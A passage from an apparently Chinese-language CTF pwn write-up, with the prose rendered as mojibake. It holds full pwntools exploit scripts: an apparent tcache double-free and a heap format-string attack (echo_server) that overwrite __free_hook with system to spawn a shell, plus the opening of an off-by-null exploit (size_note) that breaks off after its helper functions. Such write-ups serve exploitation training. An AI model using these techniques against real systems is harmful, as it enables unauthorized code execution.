    sa<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sa<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sa<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>

rs<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">b'show--me'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">b'show--me'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">b'show--me'</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
dbg<span class="token punctuation">(</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
main_arena96 <span class="token operator">=</span> uu64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
__malloc_hook_mem <span class="token operator">=</span> main_arena96<span class="token operator">-</span><span class="token number">96</span><span class="token operator">-</span><span class="token number">0x10</span>
__malloc_hook_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
lbase <span class="token operator">=</span> __malloc_hook_mem <span class="token operator">-</span> __malloc_hook_libc
__free_hook <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
mysystem <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
<span class="token comment"># print("[-]",hex(__malloc_hook_mem))</span>
delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0xE</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># add(7, 0x70, p64(__malloc_hook_mem))</span>
add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-]'</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>mysystem<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>mysystem<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># dbg()</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token comment"># add(11, p64(), )</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="echo-server"><a href="#echo-server" class="headerlink" title="echo_server"></a>echo_server</h2><p>åœ¨å †ä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚å…ˆé€šè¿‡æ³„éœ²æ ˆä¸Šçš„æ•°æ®è·å¾— libc åŸºå€ï¼ˆä¸ç®¡ä¼šä¸ä¼šåšå…ˆæ³„éœ²äº†å…ˆ233ï¼‰ã€‚å› ä¸ºæ ˆä¸Šå­˜åœ¨æœ‰æŒ‡å‘æ ˆçš„æŒ‡é’ˆï¼Œé€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²å†™æ•°æ®ï¼ˆæŒ‡é’ˆï¼‰åˆ°æ ˆä¸Šï¼Œå†æŠŠé‚£ä¸ªæŒ‡é’ˆä½œä¸ºè·³æ¿ä»»æ„åœ°å€å†™ã€‚å†™è¿™é“é¢˜çš„æ—¶å€™æˆ‘å¤šåšäº†å¥½å‡ æ­¥éª¤ï¼Œé«˜åœ°å€æ²¡å¿…è¦å†™çš„ :(</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># å¸¸ç”¨çš„æ¨¡æ¿å¤§æ¦‚æ˜¯</span>
<span class="token operator">%</span><span class="token punctuation">[</span>order<span class="token punctuation">]</span>$<span class="token punctuation">[</span><span class="token builtin">format</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>addr<span class="token punctuation">]</span><span class="token operator">%</span><span class="token punctuation">[</span>order<span class="token punctuation">]</span>$s
<span class="token punctuation">[</span>addr<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>pad<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">%</span><span class="token punctuation">[</span>order<span class="token punctuation">]</span>$n
<span class="token comment"># è¿™é“é¢˜æ˜¯åœ¨å †ä¸Šçš„,æ‰€ä»¥ç”¨ä¸åˆ°ï¼Œä½†æ˜¯è¿™äº›å¸¦æ¥ä¸€ç‚¹çµæ„Ÿ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/python3</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
<span class="token comment"># functions for quick script</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
<span class="token comment"># misc functions</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">rs</span><span class="token punctuation">(</span>arg<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> p
    <span class="token keyword">if</span> arg <span class="token operator">==</span> <span class="token string">'remote'</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token operator">*</span>host<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> binary<span class="token punctuation">.</span>process<span class="token punctuation">(</span>argv<span class="token operator">=</span>arg<span class="token punctuation">,</span> raw<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
host <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">6666</span><span class="token punctuation">)</span>
binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./echo'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
ld   <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ld-2.31.so'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

rs<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># leak lbase</span>
ru<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span><span class="token string">b'100'</span><span class="token punctuation">)</span>

sl<span class="token punctuation">(</span><span class="token string">b'%13$p\n%6$p'</span><span class="token punctuation">)</span>
__libc_start_main243 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
rbp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
lbase <span class="token operator">=</span> __libc_start_main243 <span class="token operator">-</span> <span class="token number">243</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>
leak<span class="token punctuation">(</span><span class="token string">'lbase'</span><span class="token punctuation">,</span> lbase<span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'rbp'</span><span class="token punctuation">,</span> rbp<span class="token punctuation">)</span>
__free_hook <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
<span class="token comment"># __free_hook = lbase + libc.sym['__realloc_hook']</span>
mysystem <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>

leak<span class="token punctuation">(</span><span class="token string">'mysystem'</span><span class="token punctuation">,</span> mysystem<span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">,</span> __free_hook<span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">'%&#123;&#125;c%10$hn\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>__free_hook <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">'%&#123;&#125;c%6$hhn\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>rbp<span class="token operator">+</span><span class="token number">0x12</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">'%&#123;&#125;c%10$hn\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__free_hook <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">'%&#123;&#125;c%6$hhn\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>rbp<span class="token operator">+</span><span class="token number">0x14</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">'%&#123;&#125;c%10$hn\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__free_hook <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>
<span class="token comment"># æ ˆä¸Šå†™å…¥ __free_hook çš„åœ°å€äº†</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">'%&#123;&#125;c%6$hhn\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>rbp<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>
<span class="token comment"># æ¢å¤äº†æ ˆæŒ‡é’ˆçš„æŒ‡å‘</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">'%&#123;&#125;c%12$hn\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>mysystem <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">'%&#123;&#125;c%10$hhn\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__free_hook <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">'%&#123;&#125;c%12$hn\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>mysystem <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">'%&#123;&#125;c%10$hhn\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__free_hook <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">'%&#123;&#125;c%12$hn\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>mysystem <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>
<span class="token comment"># __free_hook ä¸Šå·²ç»å†™ä¸Šäº† system</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">b'/bin/sh\x00'</span>
sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'0'</span><span class="token punctuation">)</span>
<span class="token comment"># æœ€å free</span>

irt<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="size-note"><a href="#size-note" class="headerlink" title="size_note"></a>size_note</h2><p>libc-2.27.soï¼Œä¿æŠ¤ä¹Ÿå…¨å¼€äº†</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">pt_list<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> pt_list<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> sz_list<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å­˜åœ¨ off by nullï¼Œçœ‹ä¸Šå»æ²¡æœ‰ UAFï¼Œä½†æ˜¯ç»è¿‡æ“ä½œä¹‹åå°±æ˜¯åŸºæœ¬çš„ UAF äº†ã€‚åˆ†é…ä¸‰å— unsorted binï¼Œå¤§å°å¾—æ˜¯ 0x??8 ä»¥ä½¿ç”¨å®ƒçš„ç©ºé—´å¤ç”¨ã€‚é€šè¿‡è¦†ç›–ä½¿ç”¨ æœ€åä¸€å—ä¸­è¡¨ç¤ºå‰ä¸€å—çš„ sizeï¼Œå¿…é¡»è¦åˆšå¥½ï¼Œåœ¨2.27 ä¸­å­˜åœ¨æ ¡éªŒï¼Œå’Œ prev_inuse å°±å¯ä»¥è®©å¯¹ç®¡ç†å™¨è¿›å…¥åˆå¹¶æµç¨‹ã€‚ç„¶åå†åˆ†å‰² unsorted binï¼ŒæŠŠ main_arena96 æ¨è¿›åˆ°ç¬¬äºŒå—ä¸ºè¢«é‡Šæ”¾çš„å †ä¸Šã€‚æ­¤æ—¶å°±å­˜åœ¨äº† UAF äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¸¸ç”¨çš„æ‰‹æ®µã€‚</p>
<p>å…·ä½“å¯ä»¥è§å›¾ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220407125101942.png" alt="image-20220407125101942"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/python3</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
